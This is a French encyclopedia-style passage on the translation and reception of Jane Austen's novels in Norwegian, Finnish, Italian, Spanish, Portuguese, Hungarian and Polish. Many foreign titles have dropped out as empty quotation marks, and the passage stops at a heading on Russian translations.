Vers une certaine reconnaissance.
C'est en 1994 que l'éditeur Aschhoug commanda à Merete Alfen la traduction de tous les romans de Jane Austen, sauf "Northanger Abbey". Ainsi parurent, en 1996, "Emma", en 1997, ' (« Raison et sentiment »), en 1998, ' (« Persuasion »), en 2000, "Mansfield Park" et en 2003 "" (« Orgueil et préjugé »). Extrêmement fidèles, ces traductions utilisent cependant des archaïsmes, qui donnent une langue plus datée que l'anglais standard de Jane Austen, parce que le norvégien a beaucoup plus changé que l'anglais en deux siècles. À l'époque de Jane Austen on parlait danois en Norvège, et même Ibsen écrit dans une langue plus proche du danois que du norvégien actuel. Ces traductions participent ainsi à la nostalgie qui alimente l'« industrie austenienne ».
Au début du Jane Austen est considérée par les histoires de la littérature avec une certaine misogynie. En 1905, Just Bing, qui la place dans son chapitre consacré au Romantisme, analyse "Mansfield Park" (montrant un certain faible pour le personnage de Mary Crawford), et admire les « petites » intrigues de ses « petits » romans, les femmes, selon lui, ne pouvant créer que de « petits » chefs-d'œuvre, car (""). Dans les années 1970, on reconnaît son importance dans la littérature de la Régence, mais une place limitée par sa condition de femme. Avec la vague de féminisme des années 1970, les études sur la littérature féminine se multiplient et les thèses de doctorat augmentent, toutes, sauf deux, soutenues par des femmes : il y en a eu quatre entre 1920 et 1960, neuf en 1970, douze dans les dernières années de 1990 et moins de la moitié ont une approche féministe.
Les adaptations ont joué un rôle essentiel dans l'intérêt nouveau porté à Jane Austen, d'autant que les traductions nouvelles coïncidaient avec leur passage sur les écrans. Les films passent en version originale en Norvège et la popularité de la mini-série de la BBC fut extraordinaire, suivie de peu par celle du film d'Ang Lee. Pourtant, son image est ambivalente : louée pour son esprit et son ironie, la langue de ses romans « intemporels », elle est encore parfois présentée comme une femme de l'époque victorienne, une vieille-fille de la gentry, auteur de romances.
Traductions en finnois.
La Finlande est un pays avec deux langues officielles, le finnois et le suédois (parlé par environ 5 % de la population) qui fut longtemps la langue des lecteurs cultivés. Jusque dans les années 1950 la littérature anglophone est peu connue, la Finlande étant plutôt tournée vers la Suède et les pays de langue germanique, tandis que les intellectuels se tournaient vers la France. En outre, au la littérature en finnois privilégie l'image du paysan et de la femme forte, maternelle et protectrice, véhiculant une certaine méfiance à l'égard des personnages appartenant aux classes supérieures. Les textes traduits sont d'abord des textes religieux et didactiques, plus quelques grands auteurs comme Shakespeare, Dickens, Tolstoï ou Dostoïevski.
Les premières traductions.
Il existe pourtant une traduction de "Pride and Prejudice" par O. A. Joutsen, parue en 1922 sous le titre "", une traduction non exempte d'erreurs liées à une mauvaise compréhension du texte source. Sur la première de couverture, illustrée par la demande en mariage de Darcy (il a un genou en terre et Elizabeth lui tourne le dos), le nom de l'auteur, tout petit, est pratiquement invisible et l'avertissement fait allusion à l'admiration de Disraeli pour Jane Austen, allusion reprise dans la plupart des présentations des traductions suivantes.
Ce roman bénéficie d'une nouvelle traduction en 1947, par Norko-Turja et Sirkka-Liisa, avec des illustrations de C. E. Brock. Suivent, entre 1950 et 1954, les traductions de tous les autres romans, faites par des professionnels, parfois écrivains eux-mêmes, comme Eila Pennanen, la traductrice de "Northanger Abbey" :
en 1950, traduction d"Emma" par Aune Brotherus, dans la collection (les grands romans du monde) ;
en 1951, "" (« Cœur capricieux »), traduction de "Persuasion" par Kristiina Kivivuiri ;
en 1952, ', traduction de ', par Aune Brotherus, et
en 1953, "" (La jeune fille dans le vieux château), par Eila Pennanen, tous deux dans la collection ;
Enfin, "Mansfield Park" est traduit par A. R. Koskimies sous le titre "" (« Histoire d'une jeune fille en famille d'accueil »).
Tous ces romans sont parus chez le premier éditeur de livres finlandais, WSOY, sauf la traduction de "Mansfield Park", publiée par Karisto, spécialisé, à l'époque, dans la traduction de fictions européennes moins connues. C'est Karisto qui publiera aussi les romans inachevés, "Sanditon" en 1977 et "The Watsons" en 1978.
En 1922, les notes et l'introduction de la traduction de "" présentent aux potentielles lectrices Jane Austen comme une femme qui leur ressemble, une aimable femme d'intérieur, qui tricote et tisse, . Il faudra attendre l'édition révisée de "Mansfield Park", en 1970, pour en avoir une présentation plus conforme à la réalité, mais les traductions chez WSOY véhiculent aussi des clichés, tant par leurs illustrations de couverture que les explications sur les rabats : ce sont de romantiques histoires d'amour du bon vieux temps, écrites par une jeune femme aimable, féminine, intelligente et pleine d'esprit, morte jeune et n'ayant connu la célébrité qu'après sa mort.
À une époque où les classes sociales qui pouvaient, en Finlande, être comparées à la ' parlaient plutôt suédois, les traducteurs en finnois ont cherché dans leur culture, des équivalents à des termes comme ' (domaine, propriété), traduit ' (ferme) : du coup, les personnages de Jane Austen semblent appartenir à une petite bourgeoisie campagnarde, et Robert Martin, le fermier que Mr Knightley considère comme un ', devient un simple paysan ('). La notion si importante à l'époque de Jane Austen de ' (correct, convenable) est traduite par une douzaine d'équivalents dépendant du contexte, édulcorant son sens profond, et la ' (convenance, bienséance, décence), traduite par ', étant étymologiquement liée en finnois aux mots ' (propriété, domaine) et ' (caste, rang), l'univers austénien paraît bien lointain quand l'idéologie dominante est la démocratie égalitaire. De même, les traductions échouent à rendre l'ironie, tournure d'esprit peu familière aux Finlandais, réduisant les romans de Jane Austen à de pâles romans d'amour romantiques, même si les critiques soulignent, les uns son exceptionnelle habileté à enrichir la narration de détails et sa maîtrise des dialogues (Kari Jalonen, en 1977), les autres la clarté de sa langue et sa finesse psychologique (Paavo Lehtonen, en 1978).
Après les années 1970.
Ce qui a finalement rendu Jane Austen plus familière au grand public, ce sont les adaptations. La plupart des versions télévisées ont été vues sur Channel 1, la chaîne publique culturelle, à partir de la mini-série de 1967, jugée très négativement par le critique de télévision Jukka Kajava (1943-2005), qui est allé jusqu'à la comparer au soap opera américain "Peyton Place". Il présente ensuite la version suivante, sortie en 1980, comme un bon conte de fée pour adultes mettant en scène une jeune fille luttant pour devenir quelqu'un, sur fond d'éducation victorienne .
Dans la même période paraissent plusieurs articles de fond. En 1987, Erkki Toivanen, dans le magazine féminin conservateur, "Kotiliesi", situe enfin Jane Austen dans la petite "gentry" cultivée, la présente comme un auteur du siècle des Lumières, même si les encyclopédies la rangent encore souvent parmi les Romantiques anglais, et une pionnière du roman psychologique. En 1992 la critique féministe Ovaska voit dans "Northanger Abbey" moins une parodie des romans gothiques qu'une critique puissante de la société de l'auteur, et en 2003 Kyösti Niemelä présente ce même ouvrage comme un roman d'apprentissage avec .
L'intérêt explose brusquement en 1996, avec la sortie groupée de la série de la BBC et des films : celui d'Ang Lee, les divers "Emma" (incluant "Clueless"), et "Persuasion", sources de nombreux articles qui corrigent nombre de poncifs et d'idées fausses sur Jane Austen. La critique cinématographique Helena Ylänen juge le film de Douglas McGrath élégant mais sans profondeur, considère la série de la BBC « pas mal » et les autres films divertissants. Mais surtout, toutes ces adaptations permettent à Diana Webster, maitre de conférences à l'université d'Helsinki, d'expliquer dans une interview du comment un auteur placé, dans les librairies, entre "Angélique" et Barbara Cartland, peut être un classique de la littérature, alors que .
Mais cet intérêt faiblit ensuite, puisque, depuis 2003, aucune traduction des grands romans de Jane Austen n'est plus disponible en librairie. Cependant, paraît en 2005 une biographie de Jane Austen grand-public, celle de Carol Shields et en 2007 la première traduction de textes tirés des "Juvenilia" par Inkeri Koskinen.
Traductions dans les pays de langue latine du Sud.
Traductions en italien.
En Italie, les maisons d'édition ne se sont pas intéressées à Jane Austen avant 1932, date de la traduction de "" par Giulio Caprin. Si les critiques littéraires ont admis très tôt son importance, ils en ont une vision contradictoire, et la comparent toujours à des auteurs italiens. Certains en ont une vision paternaliste : ainsi, pour Giulio Caprin, elle est une et pour Mario Praz, la romancière la plus caractéristique du avec Richardson, dont l'écriture précise, le style « notarial », la retenue, la rapprochent de Manzoni. En revanche, le critique littéraire et traducteur Carlo Izzo, suivant Emilio Cecchi qui a souligné dès 1915 sa subtile subversion, préfère la comparer au divin Arioste, écrivant qu'elle a porté le roman « domestique » à un tel niveau de perfection structurelle et formelle qu'après elle rien d'autre n'était possible à part le roman victorien.
Dans les années 2000 pourtant, les préfaces des éditions grand-public véhiculent encore l'idée que tout a déjà été définitivement dit sur Jane Austen, auteur « transparent » à l'humour léger et l'ironie bienveillante, qui ne requiert pas d'étude plus approfondie, ignorant toutes les études récentes qui la replacent dans son contexte social, économique, esthétique et littéraire, même si, dès le début des années 1970, Beatrice Battaglia, de l'université de Bologne, a analysé ses méthodes stylistiques et son art de la parodie et la présente, en 2005, dans son introduction à une édition populaire des trois romans de la maturité ("Mansfield Park", "", "Emma") comme l'inventeur du roman moderne.
En 2008, les éditions Newton Compton font paraître dans la collection « "" » une édition intégrale des six romans supervisée par Ornella de Zordo, qui précise en introduction que Jane Austen a été jugée très différemment selon les époques et que, ().
Les romans de Jane Austen ont tous fait l'objet de nombreuses traductions en italien chez divers éditeurs, les plus traduits étant ', suivi d"Emma" et de ' à partir de 1945. Mais les traducteurs, pas toujours très au fait des règles en usage dans la "gentry" à l'époque de la Régence, transforment souvent les textes originaux en fictions romantiques à la Barbara Cartland ou en « merveilleuses comédies sentimentales ». En outre, traduire en italien les dialogues de Jane Austen étant une tâche particulièrement difficile, les traductions sont souvent peu satisfaisantes en termes de style et de langue.
"Orgoglio e pregiudizio".
À la différence des traductions en français, toutes les traductions de ' portent le même titre en italien : ', sauf celle de Giulio Caprin (1880-1958) en 1932, titrée ' et fréquemment rééditée : en 1957, en 1983 (dans la collection « ' »), en 2007, en 2010. Elle reste la meilleure des traductions : il était lui-même écrivain, critique littéraire, à l'occasion pamphlétaire, grand connaisseur des comédies de Goldoni.
En 1945 celle d'Itala Castellini et Natalia Rosi est éditée dans la collection « "Zodiaco " ». Elle est reprise par Newton &amp; Compton en 1996, 2004, 2006, 2010, avec une introduction de Riccardo Reim. Il n'y en a pas de nouvelle jusqu'en 1952, celle de Maria-Luisa Agosti-Castellani (éditions Rizzoli), reprise dans la collection « "BUR" » en 1995. En 1957 paraît celle de Liliana Silvastri (chez Labor, à Milan), en 1966 celle d'Igninia Dina (chez Bulgarini à Florence) ; 1968 en voit paraître deux chez le même éditeur, "", dans des lignes éditoriales très différentes :
celle de Maria Pia Balboni, dans la collection « ' », et la réédition dans la collection « "I Darling, " » de celle de Rosa Pino, parue en 1959 dans la ', une collection de « livres délicieux » pour jeunes filles.
À partir des années 1980, les traductions nouvelles se succèdent régulièrement, chez de multiples éditeurs, mais elles ont en général beaucoup de défauts : précipitation, imprécision du vocabulaire et des temps, archaïsmes, anglicismes, redondances, d'où un aspect peu naturel et un manque de cohérence. Les traductrices hésitent entre garder le vouvoiement et les titres anglais (') ou essayer de les traduire en ', ce qui fait artificiel. Outre celle d'Isa Maranesi, parue en 1980 dans la collection « ' », sortent, en 1994 celle de Stefania Censi, pour ' (rééditée en 1997 aux éditions Theoria) ; en 1996 celle de Susanna Basso dans la collection « ' » (éditions Frassinelli) ; en 2004 celle de Barbara Placido (') et en 2006 celle de Cecilia Montonati, dans la collection « " ».
En 2013 Claudia Manzolelli, fait précéder sa traduction pour la ", d'une brève note insistant sur ().
En outre une adaptation en cinq épisodes avec Virna Lisi et Franco Volpi est tournée pour la RAI en 1957, et un audiolivre lu par Paola Cortellesi est paru en 2009 (version intégrale, Emons Audiolibri).
"Sense and Sensibility".
', le titre choisi par Berto Minozzi (à Milan, chez Cavallotti) en 1951 est le plus utilisé, mais on trouve ' en 1945 pour la première traduction par Evelina Levi (à Rome, chez Astrea), qui choisit d'inverser les termes, ' pour l'édition abrégée de Rosanna Sorani en 1969, dans la ', ' pour la traduction d'Enrica Ciocia Castellani, en 1957 à Turin, ' pour l'édition établie par Valentina Bianconcini, à Bologne en 1961, toutes traductions antérieures à la parution du film d'Ang Lee, sorti en Italie en avec le titre "Ragione e sentimento", qui s'impose désormais.
Deux traductions sont titrées ', celle de Beatrice Boffito Serra, en 1961 à Milan, pour la "Biblioteca Universale Rizzoli", mais rééditée en 1996 sous le titre ' (introduction de Pietro Citati) et celle présentée et établie en 1995 par Pietro Meneghelli, à Rome pour la "Biblioteca economica Newton", rééditée en 2004 avec "" et en 2008 chez Newton &amp; Compton avec une introduction de Loredana Lipperini.
Les autres traductions (ou rééditions), souvent accompagnées de textes de présentation, portent toutes le titre qui fait désormais consensus : celle de 1991 (présentée par Malcolm Skey et introduite par Sandra Petrignani) ; en 1996, celle de Stefania Censi ; en 2010, celle de Luca Lamberti (introduite par Roberto Bertinetti) et celle de Monica Luciano, accompagnée de la traduction du texte de Virginia Woolf ; en 2011 celle de Renato Chiaro ; en 2012 celle de Franca Severini (introduite par Sara Poledrelli).
Les autres romans.
On peut se demander pourquoi il existe tant de traductions en italien - Beatrice Battaglia, en 2006, en recense dix-sept pour ', douze pour "Emma", six pour ', cinq pour "Mansfield Park" et "Persuasion" et trois pour "Northanger Abbey", et quel rôle jouent les considérations et opportunités économiques, car certaines sont de simples révisions de traductions antérieures. Ainsi, celle d"Emma", présentée et établie en 1995 par Pietro Meneghelli, est identique à celle de Beatrice Boffito Serra, de 1961.
Traductions en espagnol.
Il existe peu de traductions de romanciers anglais en espagnol au , et ces traductions passent toutes par le filtre des traductions françaises. Si Jane Austen est inconnue des lecteurs hispanophones, Antonio Alcalá Galiano considère qu'elle mérite d'être lue, car les . Manuel de la Revilla et Pedro de Alcántara Garcia la citent dans leurs" " parmi les grands auteurs satiristes d'Angleterre, à côté de Swift, Sterne, Lord Byron, Thomas Moore. La femme de lettres Emilia Pardo Bazán la replace dans le contexte de la conquête de la reconnaissance de leur statut d'écrivain par les romancières anglaises, et considère que leur situation de filles ou épouses de clergymen explique les leçons de morales insérées dans les ouvrages .
Mais depuis les années 1990 traductions et rééditions se multiplient ; on peut aussi trouver tous les romans, sauf "Mansfield Park" traduits en catalan. Même les œuvres mineures sont maintenant traduites. Cependant la prolifération des éditions bon marché permet d'affirmer que la popularité de Jane Austen rejoint celle des sœurs Brontë, avec le même inconvénient que dans d'autres langues : la confondre avec les auteurs de « romans féminins » et de romances.
Premières traductions.
Le premier roman traduit est ' en 1919 par Manuel Ortega y Gasset paru dans ' des éditions Calpé, suivi de ' par Isabel Oyarzabal en 1921 et ' en 1924 par José de Urries y Azara. Jane Austen y est présentée comme un auteur d'une grande profondeur psychologique.
Il n'y a pas d'autres traductions avant les années 1940. ' est traduit en 1942 par Maria Teresa Moré (') ; ' en 1943 par Guillermo Villalonga (') ; ' la même année par R. Berenguer (') ; "Persuasion" et "Emma" en 1945, respectivement par Juan Ruiz de Larios et par Jaime Bofill y Ferro.
Les autres traductions sont presque toujours anonymes, quelle que soit la date de parution. Pour ', de très loin le plus traduit (1945, 1949, 1956, 1957, 1970, 1973, 1996, 1998, 2002, 2008) ; pour " " ('), 1946 et 1953 ; pour "Emma", 1997 ; pour ', 1941, 1948, 1985, 1986, 1998 ; pour ', 1965, 1996, 2008.
Comme les traductions précoces en d'autres langues, la plupart des traductions, surtout les plus anciennes, signale Aida Díaz Bild, . Peu contiennent des appendices ou des notes. Il faut attendre les années 1990 pour trouver des éditions de type universitaire (, chez Cátedra), avec des introductions développées.
Alors que pendant plus de vingt ans, sous le régime franquiste, aucune traduction n'est éditée, la conformité des romans de Jane Austen avec le code moral en faveur dans l'Espagne franquiste (les femmes ont vocation à se marier) entraîne l'adaptation de quatre romans à la télévision espagnole entre 1966 et 1972 : ', mini-série, en dix épisodes de 20 min, en noir et blanc, est diffusé au printemps 1966 en soirée. Viennent ensuite "Emma" (), ' (fin ) et "Persuasion" ().
' est incontestablement le roman de Jane Austen qui bénéficie du plus grand nombre de traductions et d'éditions depuis la première traduction en 1924. La traduction anonyme, parue en 1945, est la seule titrée ' (Plus fort que l'orgueil). Cette traduction est très vraisemblablement justifiée par le film de Robert Z. Leonard, sorti en Espagne sous ce titre cette année-là. En 1949, parait, toujours anonymement, "". Ce titre prévaut pour toutes les traductions.
Entre 1972 et 2007, ce roman a bénéficié, rien qu'en Espagne et en castillan, de quarante éditions, avec une accélération dans les dernières années, à laquelle les adaptations pour petit et grand écran ne sont probablement pas étrangères. La traduction de Fernando Durán, illustrée par José Narro, parue en 1956, bénéficie de sept rééditions entre 1958 et 2003, celle d'Amando Lázaro Ros, parue l'année suivante, est rééditée onze fois entre 1957 et 2013, celle d'Ana María Rodríguez, parue en 1996 à Barcelone, est pratiquement rééditée tous les ans. Ce qui n'empêche pas la parution de deux nouvelles traductions en 2002, l'une par Alejandro Pareja Rodriguez (rééditée en 2004) et l'autre par Kiky Rodriguez.
On trouve aussi des traductions en Amérique latine : à Buenos Aires, ' en 1945 et ' en 1951 ; à Mexico ' en 1959. Et, plus récemment, des traductions en langues régionales : en 1985 ', première traduction en catalan ; en 1996 ', première traduction en basque, en 2005 ', première traduction en galicien, par José Diaz Lage, avec une introduction de Carlos J. Gomes Blanco.
Les autres romans.
" " a une grande variété de titres en espagnol, encore plus qu'en français : ' et ' sont les plus courants, mais on trouve aussi ' (Bon sens et sensibilité) en 1946 pour la traduction de Fernando Durán ; ' (Jugement et sentiments) pour la première traduction de 1942, puis celle de Luis Magrinyà en 1993 ; ' (Jugement et sensibilité) en 2000. Une version condensée parait en 1965, puis une longue période se passe avant la traduction de Luis Magrinyà, qui fait l'objet de multiples rééditions : 1995, 1996, 1997, 2001, 2002, 2003. La traduction d'Ana María Rodríguez ', parue au moment de la sortie en Espagne du film d'Ang Lee, est rééditée en 1997, 1998, 1999, 2000, 2003, 2004.
En ce qui concerne ', le titre est traduit dans deux versions : ' chez Guillermo Villalonga, qui date de 1943, "" chez José Maria Balil Giró en 1954, mais en espagnol le mot "parque" a rarement le sens de domaine. Les autres traductions gardent le titre anglais, en particulier celle de Miguel Martin, sortie en 1995, réédité en 1997, 1998, 2000, 2003, 2004.
"Emma" est traduit une première fois par Jaime Bofill y Ferro en 1945, puis en 1971 par José Luis López Muñoz (réédité en 1996). La traduction sortie en 1997 est anonyme.
' est présenté avec ' en 1997.
Traductions en portugais.
Le premier roman traduit en portugais, en 1847, est "Persuasion", par Manuel Pinto Coelho de Araùjo, dont le titre "", semble indiquer qu'il s'agit probablement d'une traduction à partir du texte en français. Toutes les traductions suivantes paraissent à partir des années 1940 et se partagent entre le Portugal et le Brésil où sortent aussi des éditions bilingues.
Traductions des années 1940.
À part "Mansfield Park", tous les romans ont bénéficié d'une traduction, voire de plusieurs, entre 1941 et 1944 :
Leyguarda Ferreira propose cette même année une traduction de "Persuasion", titrée ' (Sang bleu, roman), qui se présente comme une « traduction libre » (rééditée en 1949, 1954, 1961), puis en 1949, une autre « traduction libre », de ', cette fois, "", rééditée en 1954, 1960, 1972.
Traductions postérieures.
"Pride and Prejudice".
Ce roman, toujours titré "", bénéficie comme partout du plus grand nombre de traductions et de rééditions.
En 1956 paraît à Porto une traduction (en deux tomes) par José da Natividade Gaspar (rééditée en 1963 et 1972) puis en 1975, la traduction de Maria Francisca Ferreira de Lima (à Mem Martins, éditions Europa-América), rééditée en 1978, 1989, 1996, 2002, 2003.
Mais la plupart paraissent chez des éditeurs brésiliens : à la fin des années 1960, traduction de Lúcio Costa, rééditée en 1982, 1998, 2006, 2010 ; en 1970, traduction et adaptation par le poète brésilien Paulo Mendes Campos (1922-1991), reprise en 2009 ; en 2006 traduction de Roberto Leal Ferreira (rééditée en 2007, 2008, 2009, 2010 et 2012) ; en 2008, traduction de Marcella Furtado pour la première édition bilingue brésilienne (rééditée en 2011) ; en 2010 édition en livre de poche de la traduction de Celina Portocarrero ; en 2011 traduction d'Alexandre Barbosa de Souza pour la Companhia das Letras, qui commence à éditer en portugais des titres du catalogue de "Penguin Classic", avec la même présentation que l'édition en anglais.
"Northanger Abbey".
Les titres sont variés : ainsi, en 1955, sort à Porto ' par « M.C ». La traduction de Maria Fernanda éditée à Lisbonne en 1956 (rééditée en 1963) est titrée ', celle d'Isabel Verissimo en 1996 "".
Mais les traductions du reprennent le titre des années 1940, "" : au Portugal,
celles de Luiza Mascarenhas en 2004 (Mem Martins, Europa-América), et de Mafalda Dias (Matosinhos, Coleção Clássicos da Literatura Universal) en 2011 ;
au Brésil, celle d'Eduardo Furtado en 2009 (première édition bilingue), celle de Roberto Leal Ferreira en 2010, celles de Rodrigo Breunig (en livre de poche) et de Julia Romeu en 2011.
"Persuasion".
Sous le titre désormais fixé, ', parait à Porto en 1955, la traduction de Fernanda Cidrais, (rééditée en 1963) ; à Mem Martins en 1996, celle d'Isabel Sequeira (Europa-América) ; à Lisbonne en 1997 celle de Fernanda Pinto Rodrigues. Au Brésil, Editorial Bruguera édite en 1971 la traduction de l'universitaire Luisa Lobo, dans une collection de (').
"Sense and Sensibility".
La traduction de Mario da Costa Pires en 1961 paraît sous un nouveau titre : ' (les raisons du cœur). Le poète et traducteur Ivo Barroso, en 1982, choisit '.
Ensuite, les deux termes sont inversés dans les traductions portugaises plus récentes, ', par Maria Luisa Ferreira Costa en 1981, et par Mário Correira Dias en 1996. Les éditeurs brésiliens privilégient ' (titre des traductions de Roberto Leal Ferreira en 2009, et d'Adriana Sales Zardini, pour l'édition bilingue de 2010). Ces titres correspondent à ceux du film d'Ang Lee sorti sur les écrans en 1996 qui est titré au Brésil ' et au Portugal '.
Les autres romans.
"Emma" bénéficie en 1963 d'une nouvelle traduction au Portugal, par Mario da Costa Pires, intitulée "" et d'une autre au Brésil en 1996 par Ivo Barroso.
Mais la seule traduction en portugais de "Mansfield Park", "" par Aida Amélia Pora (Europa-América, Mem Martins) ne date que de 2003.
Intérêt lusophone pour Jane Austen.
Des mémoires de maîtrise sont soutenus à l'université de Lisbonne en 1940, 1956, 1959, 1968 ainsi qu'une thèse de doctorat, non publiée, en 1988 : " : ". Divers articles sont consacrés à Jane Austen dans des revues littéraires par Alvaro Pina en 1990 et 1993, une biographie est publiée en 1994.
Dans un article publié en 1976 Irwin Stern (universitaire de Caroline du Nord) se demande même si Jane Austen a pu influencer Júlio Dinis (1839-1871), le premier grand écrivain de langue portugaise de l'époque moderne, auteur réaliste de « romans ruraux ». Il y souligne, outre des ressemblances troublantes entre ' et ', la similarité de leur mode de vie et de leur style d'écriture.
Traductions en hongrois et dans les langues slaves du nord.
Traductions en hongrois.
Au les romans de Jane Austen n'étaient connus, en version originale ou en français, que dans quelques familles cultivées. Ainsi, Lajos Kossuth possédait un exemplaire de "Sense and Sensibility" et un d"Emma", probablement acquis quand il était réfugié en Angleterre après l'échec de la révolution hongroise.
La première traduction en hongrois est celle de "Pride and Prejudice", par Sándor Hevezi, parue en feuilleton entre et , dans un mensuel littéraire, ', sous le titre ' (« La Famille Bennet »). La traduction, présentée comme « d'après Jane Austen », n'est pas très précise, mais s'inscrit dans la protestation contre la vogue du roman naturaliste. À cette époque, des personnalités comme l'écrivain Antal Szerb, le poète Mihály Babits, qui écrivaient dans la prestigieuse revue "Nyugat", ouvraient la Hongrie à la littérature occidentale. En 1929 Szerb y présente Jane Austen comme , et en 1941 comme un . Babits la relie d'un côté à Fielding et Smollett, de l'autre en fait le précurseur de George Eliot. Mais, après la guerre, le contexte politique et la soviétisation systématique instaurée par Mátyás Rákosi ne sont pas bien favorables aux auteurs occidentaux. Ce n'est qu'après la révolution de 1956 que se met en place une politique de traduction d'auteurs classiques « sûrs » et « de confiance ».
En 1958, Miklós Szenczi, universitaire spécialiste d'Austen, propose une nouvelle et excellente traduction de ' (') dans une collection de « Classiques de la littérature mondiale », où paraissent, la même année, des traductions de "Madame Bovary, la Chartreuse de Parme, Tom Jones" et les "Nouvelles exemplaires". Il faudra ensuite attendre une dizaine d'années pour voir traduire progressivement les autres romans, tous chez le même éditeur, Európa Press, par de très bons traducteurs, dans des éditions soignées et très bon marché, tirées à grande échelle.
"Mansfield Park" est traduit en 1968 par Ádám Réz sous le titre "" (« La maison Mansfield »), "Emma" en 1969 par Dóra Csanak.
Les trois autres romans devront attendre un peu : 1976 pour ' (') traduit par Mária Borbás, 1980 pour "Persuasion" (' [« Arguments convaincants »]) par Ilona Róna et 1983 pour "Northanger Abbey" par Mária Borbás sous le titre ' (« le secret du cloitre »).
Les traductions sont généralement accompagnées de notes, d'une préface, d'un apparat critique qui souligne le réalisme et l'aspect social. 
Au vu du succès des volumes individuels, entre 1976 et 1983, les six romans parurent en collection, reliés, avec une jaquette dessinée par Viola Berki, à la demande de Mária Borbás.
En avril et la version d’"Emma" produite en 1972 pour la BBC par John Glenister est diffusée sur la chaine de la télévision hongroise, à une heure de grande écoute. Les critiques ne sont pas très favorables mais donnent aux spécialistes (comme Albert Gyergyai dans ') l'occasion de présenter l'écrivain sous son meilleur jour. Après 1989, des éditions communes hungaro-roumaines et hungaro-slovaques rendent les textes accessibles aux minorités hongroises en Roumanie et Slovaquie. En 1996, ' est cité parmi vingt-cinq romans importants en langue anglaise. Et comme dans d'autres pays, la diffusion des adaptations à partir de 1996, sous-titrées (les films) ou doublées (la série de la BBC), entraîna une vague d"austenmania". Les éditions populaires se sont alors emparées des romans de Jane Austen qui sont édités depuis 1999 dans des collections sentimentales comme "" (littérature amoureuse du monde). Mais le signe le plus clair de la popularité de Jane Austen en Hongrie est la sortie en 2003 d'une version audio de "Persuasion" en onze cassettes par l'association hongroise des aveugles et malvoyants.
Traductions en polonais.
L'histoire troublée de la Pologne, qui fut dépecée et rayée de la carte pendant plus d'un siècle et n'a retrouvé son indépendance qu'après 1918, peut expliquer le manque d'intérêt des Polonais pour le roman, genre littéraire moins prisé durant l'époque romantique que la poésie ou le théâtre. Les exilés produisent une littérature politique (concernant l'histoire de la Pologne et de Polonais célèbres), voire patriotique, mettant en scène des personnages héroïques et prêts au sacrifice. Aussi Walter Scott et Byron (qui ont fortement influencé Adam Mickiewicz en particulier) sont-ils traduits dès 1820. En outre, une tradition francophile très ancienne en Pologne et l'apprentissage de l'allemand comme langue étrangère, font qu'avant 1930 la langue et la culture anglaises étaient peu connues et il n'y avait pas de bons traducteurs de l'anglais, à part Aniela Zagόrska, traductrice des romans de l'écrivain d'origine polonaise Joseph Conrad.
À cette époque, existaient chez les spécialistes deux conceptions opposées de Jane Austen : auteur de romans d'amour vieillots et sans intérêt ou d'œuvres subtiles, pleines d'ironie, écrites de main de maître, à la hauteur des comédies de Shakespeare.
La traduction de 1934.
Le seul roman traduit avant guerre est "Sense and Sensibility". "" (Sens commun et sentiment) paraît en 1934, après "Wuthering Heights" (1929) et "Jane Eyre" (1930), traduit par Janina Sujkowska, traductrice prolifique d'Emily Brontë et d'autres écrivains anglophones.
Cette traduction, assez fidèle, est aussi adaptée à son lectorat : les détails peu parlants pour un étranger sont supprimés, les tournures en usage en anglais pour les aînées (Miss Dashwood, Miss Steele) remplacées par les prénoms (Elinor, Anna Steele) voire des diminutifs ("Eli" pour Elinor, "panie Edku" [Eddie] pour Edward), les toponymes et les patronymes polonisés (Cleverlandu, Bartonu ; Dashwoodowa, Jenningsowa), des explications ajoutées. En outre les traits de caractère sont plus marqués : Marianne est plus exaltée, Mrs Jennings est plus vulgaire. Mais on y trouve aussi des omissions et des simplifications, une langue tantôt relevée, tantôt familière, des inexactitudes, voire des contresens.
Les autres traductions.
Les autres romans de Jane Austen ne sont en fait traduits qu'après la fin du stalinisme, en commençant par "Pride and Prejudice" en 1956 (""). C'est une traductrice émérite, Anna Przedpełska-Trzeciakowska, qui a aussi traduit des textes de Walter Scott, George Eliot, Dickens et Faulkner, qui s'en charge.
Certains noms sont transcrits en polonais (Charles et Caroline Bingley deviennent Karol et Karolyna, Elizabeth est Lizzy ou Elżbieta) et le texte est saupoudré d'archaïsmes pour rendre l'anglais du début du . La traduction, considérée comme fiable, est suivie d'une postface de Zygmunt Kubiak (1929-2004). Cependant le critique Hieronim Michalski, probablement influencé par la critique marxiste, tout en admirant la qualité de la traduction, estime très surfaite la réputation de Jane Austen : du pur chauvinisme britannique ; "Orgueil et Préjugés" qu'il compare avec condescendance à "" (le lépreux), mélodrame polonais très populaire d'Helena Mniszkówna (1878-1943), rien de plus qu'un roman sentimental dépourvu d'observations réalistes et ses personnages des stéréotypes sans intérêt. À l'occasion de la réédition de 1996 cependant, Piotr Kebut parlera de très bon roman d'une grande pénétration psychologique.
Anna Przedpełska-Trzeciakowska traduit ensuite quatre des cinq autres romans : "Persuasion" ("Perswazje") en 1962 ; "Northanger Abbey" ("Opactwo Northanger") en 1975 avec des notes explicatives en bas de page ; "Sense and Sensibility", sous un nouveau titre "" (la sensée et la romanesque) en 1977 ; "Mansfield Park" en 1995, qu'elle a préfacé, estimant nécessaire d'expliquer le et le personnage d'Edmund Bertram (la Pologne est catholique), et où elle conserve les noms anglais.
"Emma" est traduit pour la première fois en 1963 par Jadwiga Dmochowska (1893-1962). Cette fois, le roman est considéré comme une œuvre majeure, et Jane Austen un grand écrivain.
Toutes ces traductions sont réimprimées, particulièrement à la fin des années 1990, à la suite du succès des adaptations et transpositions. Mais les critiques cinématographiques, considérant Jane Austen comme un écrivain mineur de romans d'amour destinés à un public féminin, estiment en général que les adaptations sont des « améliorations » : ainsi, le scénario (oscarisé) d'Emma Thompson est jugé plus attrayant que le roman-source.
Cependant, les traductions plus récentes, celle de "Sense and Sensibility" ("") en 2003 par Michał Filipczuk, et celle d"Emma" en 2005 par Tomasz Tesznar, toutes deux accompagnées d'une postface conséquente, semblent indiquer une meilleure considération littéraire pour l'œuvre de Jane Austen. Comme ailleurs aussi Internet a permis l'apparition d'une certaine "austenmania". Plus sérieusement, une thèse d'État a été publiée en 2005 et, depuis, de nouvelles traductions ont vu le jour.
Traductions en russe.
